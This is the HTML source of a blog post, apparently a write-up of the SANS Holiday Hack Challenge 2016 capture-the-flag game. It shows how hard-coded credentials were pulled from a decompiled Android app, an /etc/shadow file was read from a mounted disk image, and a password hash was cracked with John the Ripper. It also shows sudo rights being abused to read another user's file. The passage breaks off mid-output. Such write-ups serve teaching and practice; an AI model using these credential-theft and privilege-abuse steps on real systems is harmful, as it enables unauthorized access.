ELFGOODWILLTOWARDSMENCHRISTMASJOYWJOYWSANTAJOYg...]SANTASANTAHOHOHOJOYQWJOY
NORTHPOLEPEACEONEARTHGOODWILLTOWARDSMENELFELFQWQ,.]PEACEONEARTHNORTHPOLEJOY
CHRISTMASCHRISTMASJOYSANTAWGOODWILLTOWARDSMENQQWQwjPEACEONEARTHSANTAQWJOYQQ
ELFPEACEONEARTHJOYJOYJOYWSANTAQQWPEACEONEARTHCHRISTMASGOODWILLTOWARDSMENJOY
CHRISTMASJOYJOYJOYQWGOODWILLTOWARDSMENSANTAQQWGOODWILLTOWARDSMENJOYWHOHOHOQ
PEACEONEARTHSANTACHRISTMASSANTAELFELFQQWJOYWGOODWILLTOWARDSMENHOHOHOHOHOHOQ
PEACEONEARTHELFELFSANTAQWJOYNORTHPOLEPEACEONEARTHELFSANTAHOHOHOPEACEONEARTH
NORTHPOLECHRISTMASELFNORTHPOLEELFJOYQWCHRISTMASGOODWILLTOWARDSMENNORTHPOLEQ
JOYJOYSANTAJOYSANTACHRISTMASJOYQWPEACEONEARTHNORTHPOLECHRISTMASJOYHOHOHOELF
JOYPEACEONEARTHELFQWELFWCHRISTMASSANTASANTANORTHPOLEQWPEACEONEARTHJOYWJOYWQ
&lt;/pre&gt;
&lt;p&gt;Hope your neck is not stiff, 'cause you need to tilt your head to the right
to see the hidden message: &lt;code&gt;Bug Bounty&lt;/code&gt;. It so happens that the password
to the ZIP file is &lt;code&gt;bugbounty&lt;/code&gt;. We can now extract the APK file from the
ZIP archive:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; unzip SantaGram_v4.2.zip
&lt;span class="go"&gt;Archive:  SantaGram_v4.2.zip&lt;/span&gt;
&lt;span class="go"&gt;[SantaGram_v4.2.zip] SantaGram_4.2.apk password: bugbounty&lt;/span&gt;
&lt;span class="go"&gt;  inflating: SantaGram_4.2.apk&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="part-2-awesome-package-konveyance"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id2"&gt;Part 2: Awesome Package Konveyance&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Let's take a look at this APK, then! We can use &lt;a class="reference external" href="https://github.com/skylot/jadx"&gt;JADX&lt;/a&gt;
to decompile the APK.&lt;/p&gt;
&lt;p&gt;Since we're looking for credentials, we can then &lt;code&gt;grep&lt;/code&gt; on
&lt;code&gt;username&lt;/code&gt;, &lt;code&gt;password&lt;/code&gt;, etc., to find what we're looking for:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep --include &lt;span class="s2"&gt;&amp;quot;*.java&amp;quot;&lt;/span&gt; -Rn password .
&lt;span class="go"&gt;./android/support/v4/j/a/c.java:529:        stringBuilder.append(&amp;quot;; password: &amp;quot;).append(k());&lt;/span&gt;
&lt;span class="go"&gt;./com/northpolewonderland/santagram/Login.java:36:        this.c = (EditText) findViewById(R.id.passwordTxt);&lt;/span&gt;
&lt;span class="go"&gt;./com/northpolewonderland/santagram/Login.java:104:                                    aVar.b((CharSequence) &amp;quot;We&amp;#39;ve sent you an email to reset your password!&amp;quot;).a((int) R.string.app_name).a((CharSequence) &amp;quot;OK&amp;quot;, null);&lt;/span&gt;
&lt;span class="go"&gt;./com/northpolewonderland/santagram/SignUp.java:22:    EditText passwordTxt;&lt;/span&gt;
&lt;span class="go"&gt;./com/northpolewonderland/santagram/SignUp.java:29:        inputMethodManager.hideSoftInputFromWindow(this.passwordTxt.getWindowToken(), 0);&lt;/span&gt;
&lt;span class="go"&gt;./com/northpolewonderland/santagram/SignUp.java:46:        this.passwordTxt = (EditText) findViewById(R.id.passwordTxt2);&lt;/span&gt;
&lt;span class="go"&gt;./com/northpolewonderland/santagram/SignUp.java:56:                if (this.a.usernameTxt.getText().toString().matches(&amp;quot;&amp;quot;) || this.a.passwordTxt.getText().toString().matches(&amp;quot;&amp;quot;) || this.a.fullnameTxt.getText().toString().matches(&amp;quot;&amp;quot;)) {&lt;/span&gt;
&lt;span class="go"&gt;./com/northpolewonderland/santagram/SignUp.java:68:                parseUser.setPassword(this.a.passwordTxt.getText().toString());&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;./com/northpolewonderland/santagram/b.java:91:            jSONObject.put(&amp;quot;password&amp;quot;, &amp;quot;busyreindeer78&amp;quot;);&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;./com/northpolewonderland/santagram/SplashScreen.java:53:            jSONObject.put(&amp;quot;password&amp;quot;, &amp;quot;busyreindeer78&amp;quot;);&lt;/span&gt;
&lt;span class="go"&gt;./com/parse/ParseRESTUserCommand.java:39:        hashMap.put(&amp;quot;password&amp;quot;, str2);&lt;/span&gt;
&lt;span class="go"&gt;./com/parse/ParseUser.java:20:    private static final String KEY_PASSWORD = &amp;quot;password&amp;quot;;&lt;/span&gt;
&lt;span class="go"&gt;./com/parse/ParseUser.java:252:            throw new IllegalArgumentException(&amp;quot;Must specify a password for the user to log in with&amp;quot;);&lt;/span&gt;
&lt;span class="go"&gt;./com/parse/ParseUser.java:795:                final String password = currentUser.getPassword();&lt;/span&gt;
&lt;span class="go"&gt;./com/parse/ParseUser.java:810:                                if (password != null) {&lt;/span&gt;
&lt;span class="go"&gt;./com/parse/ParseUser.java:811:                                    currentUser.setPassword(password);&lt;/span&gt;
&lt;span class="go"&gt;./com/parse/ParseUser.java:998:            throw new ParseException(-1, &amp;quot;Unable to saveEventually on a ParseUser with dirty password&amp;quot;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We see that the file &lt;code&gt;./com/northpolewonderland/santagram/b.java&lt;/code&gt; is
interesting. If we open it, we'll find our wanted credentials:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File ./com/northpolewonderland/santagram/b.java, line 87&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;a&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;Context&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="n"&gt;JSONObject&lt;/span&gt; &lt;span class="n"&gt;jSONObject&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;JSONObject&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
&lt;span class="hll"&gt;        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;guest&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;busyreindeer78&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/span&gt;        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;usage&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;activity&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;put&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;udid&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Secure&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getContentResolver&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;android_id&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
        &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Runnable&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;a&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;R&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;analytics_usage_url&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="n"&gt;jSONObject&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}).&lt;/span&gt;&lt;span class="na"&gt;start&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;Log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;e&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getMessage&lt;/span&gt;&lt;span class="o"&gt;());&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The credentials in the APK file are &lt;code&gt;guest/busyreindeer78&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We're then supposed to look at an audio file. To do this, we have to take a
look at the resources of the APK file. To do this, we'll unzip the APK. Indeed,
APK files are just particular ZIP files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; unzip -d SantaGram_4.2_unzipped SantaGram_4.2.apk
&lt;span class="go"&gt;Archive:  SantaGram_4.2.apk&lt;/span&gt;
&lt;span class="go"&gt;  inflating: SantaGram_4.2_unzipped/AndroidManifest.xml&lt;/span&gt;
&lt;span class="go"&gt;  inflating: SantaGram_4.2_unzipped/META-INF/CERT.RSA&lt;/span&gt;
&lt;span class="go"&gt;  inflating: SantaGram_4.2_unzipped/META-INF/CERT.SF&lt;/span&gt;
&lt;span class="go"&gt;  inflating: SantaGram_4.2_unzipped/META-INF/MANIFEST.MF&lt;/span&gt;
&lt;span class="go"&gt;  inflating: SantaGram_4.2_unzipped/assets/tou.html&lt;/span&gt;
&lt;span class="go"&gt;  inflating: SantaGram_4.2_unzipped/classes.dex&lt;/span&gt;
&lt;span class="go"&gt;[snip for brievety]&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt; extracting: SantaGram_4.2_unzipped/res/raw/discombobulatedaudio1.mp3&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt; extracting: SantaGram_4.2_unzipped/resources.arsc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The name of the audio file in the SantaGram APK file is
&lt;code&gt;discombobulatedaudio1.mp3&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="part-3-a-fresh-baked-holiday-pi"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id3"&gt;Part 3: A Fresh-Baked Holiday Pi&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Despite what we've learned on the SantaGram bug bounty program, we're nowhere
closer to learn where Santa Claus is being held. By roaming the North Pole,
we can see password protected doors:&lt;/p&gt;
&lt;img alt="password_protected_door.png" class="align-center" src="/images/sans-christmas-challenge-2016/password_protected_door.png" /&gt;
&lt;p&gt;Next to these doors, we can see little terminals. However, in order to interact
with these terminals, we need a little system called a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Raspberry_Pi"&gt;Cranberry Pi&lt;/a&gt;.
In a sense, we're in luck because by talking to the elf Wunorse Openslae
(&lt;a class="reference external" href="https://www.youtube.com/watch?v=3PgNPc-iFW8"&gt;hey!&lt;/a&gt;), we learn that Santa's
sleigh is equiped with a Cranberry Pi, to control the SCADA interface:&lt;/p&gt;
&lt;img alt="cranpi_introduction.png" class="align-center" src="/images/sans-christmas-challenge-2016/cranpi_introduction.png" /&gt;
&lt;p&gt;Indeed, strewn across the North Pole, we can find pieces of the Cranberry Pi
system:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;A Cranberry Pi board&lt;/li&gt;
&lt;li&gt;A heat sink (why would you need one in the North Pole in the first place?)&lt;/li&gt;
&lt;li&gt;An HDMI cable&lt;/li&gt;
&lt;li&gt;An SD card&lt;/li&gt;
&lt;li&gt;A power cord&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We now have a full Cranberry Pi system. The only missing part is given by the
elf Holly Evergreen: a &lt;a class="reference external" href="https://www.northpolewonderland.com/cranbian.img.zip"&gt;Cranbian image&lt;/a&gt;,
which we can use to boot on our Cranberry Pi.&lt;/p&gt;
&lt;p&gt;However, in order to use our CranPi, we need the password to open a user
session. Luckily, &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2016/12/07/mount-a-raspberry-pi-file-system-image"&gt;this tutorial&lt;/a&gt;
by Josh Wright teaches us how we can mount a Raspberry Pi file system image.
Since Cranberry Pi and Raspberry Pi are basically the same (wake up, sheeple!),
we now know how to mount our Cranbian image:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; unzip cranbian.img.zip
&lt;span class="go"&gt;Archive:  cranbian.img.zip&lt;/span&gt;
&lt;span class="go"&gt;  inflating: cranbian-jessie.img&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; /sbin/fdisk -l cranbian-jessie.img

&lt;span class="go"&gt;Disque cranbian-jessie.img : 1,3 GiB, 1389363200 octets, 2713600 secteurs&lt;/span&gt;
&lt;span class="go"&gt;Unités : secteur de 1 × 512 = 512 octets&lt;/span&gt;
&lt;span class="go"&gt;Taille de secteur (logique / physique) : 512 octets / 512 octets&lt;/span&gt;
&lt;span class="go"&gt;taille d&amp;#39;E/S (minimale / optimale) : 512 octets / 512 octets&lt;/span&gt;
&lt;span class="go"&gt;Type d&amp;#39;étiquette de disque : dos&lt;/span&gt;
&lt;span class="go"&gt;Identifiant de disque : 0x5a7089a1&lt;/span&gt;

&lt;span class="go"&gt;Device               Boot  Start     End Sectors  Size Id Type&lt;/span&gt;
&lt;span class="go"&gt;cranbian-jessie.img1        8192  137215  129024   63M  c W95 FAT32 (LBA)&lt;/span&gt;
&lt;span class="go"&gt;cranbian-jessie.img2      137216 2713599 2576384  1,2G 83 Linux&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; mkdir cranbian_img_extracted
&lt;span class="gp"&gt;$&lt;/span&gt; sudo mount -v -o &lt;span class="nv"&gt;offset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$((&lt;/span&gt;&lt;span class="m"&gt;512&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="m"&gt;137216&lt;/span&gt;&lt;span class="k"&gt;))&lt;/span&gt; -t ext4 ./cranbian-jessie.img ./cranbian_img_extracted
&lt;span class="go"&gt;mount : /dev/loop0 monté sur ./cranbian_img_extracted.&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; ls cranbian_img_extracted/
&lt;span class="go"&gt;bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have access to the Cranbian file system. This means that we can try to
crack passwords in the &lt;code&gt;shadow&lt;/code&gt; file.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat cranbian_img_extracted/etc/shadow
&lt;span class="go"&gt;root:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;daemon:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;bin:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;sys:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;sync:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;games:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;man:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;lp:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;mail:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;news:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;uucp:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;proxy:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;www-data:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;backup:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;list:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;irc:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;gnats:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;nobody:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;systemd-timesync:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;systemd-network:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;systemd-resolve:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;systemd-bus-proxy:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;messagebus:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;avahi:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;ntp:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;sshd:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="go"&gt;statd:*:17067:0:99999:7:::&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="gp"&gt;cranpi:$6$2AXLbEoG$&lt;/span&gt;zZlWSwrUSD02cm8ncL6pmaYY/39DUai3OGfnBbDNjtx2G99qKbhnidxinanEhahBINm/2YyjFihxg7tgc343b0:17140:0:99999:7:::
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can do so by using John the Ripper with the &lt;a class="reference external" href="https://github.com/danielmiessler/SecLists/raw/master/Passwords/rockyou.txt.tar.gz"&gt;rockyou&lt;/a&gt;
dictionary:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; john --wordlist&lt;span class="o"&gt;=&lt;/span&gt;./rockyou.txt ./cranbian_img_extracted/etc/shadow
&lt;span class="go"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="go"&gt;Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])&lt;/span&gt;
&lt;span class="go"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="go"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;yummycookies     (cranpi)&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;1g 0:00:06:12 DONE (2016-12-24 19:11) 0.002687g/s 1221p/s 1221c/s 1221C/s 03698741..yoatzin&lt;/span&gt;
&lt;span class="go"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="go"&gt;Session completed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We now have a valid account: &lt;code&gt;cranpi/yummycookies&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We can now interact with every terminal in the North Pole. Every terminal is
basicaly a minimal Linux system on which we have to find some sort of flag,
to use as a passphrase to open the door next to it.&lt;/p&gt;
&lt;div class="section" id="elf-house-2"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id4"&gt;Elf House #2&lt;/a&gt;&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
*******************************************************************************
*                                                                             *
*To open the door, find both parts of the passphrase inside the /out.pcap file*
*                                                                             *
*******************************************************************************
&lt;/pre&gt;
&lt;p&gt;So, apparently, the passphrase is in two parts, in a network capture file.
Let's take a look at this file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;scratchy@31368df46952:/$&lt;/span&gt; ls -l /out.pcap
&lt;span class="go"&gt;-r-------- 1 itchy itchy 1087929 Dec  2 15:05 /out.pcap&lt;/span&gt;
&lt;span class="gp"&gt;scratchy@31368df46952:/$&lt;/span&gt; cat /out.pcap
&lt;span class="go"&gt;cat: /out.pcap: Permission denied&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, this file belongs to user &lt;code&gt;itchy&lt;/code&gt;, and we can't read it. Let's see
what's installed on the system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;scratchy@31368df46952:/$&lt;/span&gt; cat /var/log/apt/history.log
&lt;span class="go"&gt;Start-Date: 2016-11-04  18:30:58&lt;/span&gt;
&lt;span class="go"&gt;Commandline: apt-get dist-upgrade -y&lt;/span&gt;
&lt;span class="go"&gt;Upgrade: tzdata:amd64 (2016f-0+deb8u1, 2016h-0+deb8u1), tar:amd64 (1.27.1-2+b1, 1.27.1-&lt;/span&gt;
&lt;span class="go"&gt;2+deb8u1)&lt;/span&gt;
&lt;span class="go"&gt;End-Date: 2016-11-04  18:31:00&lt;/span&gt;
&lt;span class="go"&gt;Start-Date: 2016-12-01  21:18:39&lt;/span&gt;
&lt;span class="go"&gt;Commandline: apt-get install -y tcpdump sudo nano vim binutils&lt;/span&gt;
&lt;span class="go"&gt;Install: nano:amd64 (2.2.6-3), libssl1.0.0:amd64 (1.0.1t-1+deb8u5, automatic), tcpdump:&lt;/span&gt;
&lt;span class="go"&gt;amd64 (4.6.2-5+deb8u1), libpcap0.8:amd64 (1.6.2-2, automatic), vim-common:amd64 (7.4.48&lt;/span&gt;
&lt;span class="go"&gt;8-7+deb8u1, automatic), sudo:amd64 (1.8.10p3-1+deb8u3), binutils:amd64 (2.25-5), vim:am&lt;/span&gt;
&lt;span class="go"&gt;d64 (7.4.488-7+deb8u1), vim-runtime:amd64 (7.4.488-7+deb8u1, automatic), libgpm2:amd64&lt;/span&gt;
&lt;span class="go"&gt;(1.20.4-6.1+b2, automatic)&lt;/span&gt;
&lt;span class="go"&gt;End-Date: 2016-12-01  21:18:41&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, &lt;code&gt;sudo&lt;/code&gt; and &lt;code&gt;tcpdump&lt;/code&gt; were both installed on the system. Maybe
there's a particular configuration in the &lt;code&gt;/etc/sudoers&lt;/code&gt; file that allows
us to run &lt;code&gt;tcpdump&lt;/code&gt; as &lt;code&gt;itchy&lt;/code&gt; without having to provide any
password... Let's try to use &lt;code&gt;sudo&lt;/code&gt; and &lt;code&gt;tcpdump&lt;/code&gt; to read the
content of the file, and write it in another one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;scratchy@31368df46952:/$&lt;/span&gt; sudo -u itchy tcpdump -r /out.pcap -w /tmp/out2.pcap
&lt;span class="go"&gt;sudo: unable to resolve host 31368df46952&lt;/span&gt;
&lt;span class="go"&gt;reading from file /out.pcap, link-type EN10MB (Ethernet)&lt;/span&gt;
&lt;span class="gp"&gt;scratchy@31368df46952:/$&lt;/span&gt; ls -lh /tmp/out2.pcap
&lt;span class="go"&gt;-rw-r--r-- 1 itchy itchy 1.1M Dec 25 02:56 /tmp/out2.pcap&lt;/span&gt;
&lt;span class="gp"&gt;scratchy@31368df46952:/$&lt;/span&gt; sha256sum /tmp/out2.pcap
&lt;span class="go"&gt;07ec6f56c937fc939c8eb64c454ece277f8c1e4f8b851781ce7f4451d48ec985  /tmp/out2.pcap&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;w00t, we we're indeed able to copy the content of the file to another file,
which we can read, since we were able to compute its sha256 sum.&lt;/p&gt;
&lt;p&gt;I learned afterwards the existence of the &lt;code&gt;-l&lt;/code&gt; flag in &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
SUDO(8)                                                                            BSD System Manager's Manual                                                                            SUDO(8)

NAME
     sudo, sudoedit — execute a command as another user

SYNOPSIS
     sudo -h | -K | -k | -V
     sudo -v [-AknS] [-a type] [-g group] [-h host] [-p prompt] [-u user]
     sudo -l [-AknS] [-a type] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]
[...]
     -l, --list  If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.  A longer list format
                 is used if this option is specified multiple times and the security policy supports a verbose output format.
&lt;/pre&gt;
&lt;p&gt;And all this time, I was thinking:&lt;/p&gt;
&lt;blockquote&gt;
Hmm, is there a way to list what you can do with &lt;code&gt;sudo&lt;/code&gt; when you
can't read the &lt;code&gt;/etc/sudoers&lt;/code&gt; file? Well, I'll search later!&lt;/blockquote&gt;
&lt;p&gt;Why, yes, Yannick, it &lt;strong&gt;IS&lt;/strong&gt; possible! It's the &lt;code&gt;-l&lt;/code&gt; flag! You lazy, you.
#TheMoreYouKnow&lt;/p&gt;
&lt;p&gt;Anyway, if you issue &lt;code&gt;sudo -l&lt;/code&gt;, you can see that we can indeed run
&lt;code&gt;tcpdump&lt;/code&gt; and &lt;code&gt;strings&lt;/code&gt; as the &lt;code&gt;itchy&lt;/code&gt; user, without knowing
the &lt;code&gt;scratchy&lt;/code&gt; user's password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;scratchy@8bb89db76dd2:/$&lt;/span&gt; sudo -l
&lt;span class="go"&gt;sudo: unable to resolve host 8bb89db76dd2&lt;/span&gt;
&lt;span class="go"&gt;Matching Defaults entries for scratchy on 8bb89db76dd2:&lt;/span&gt;
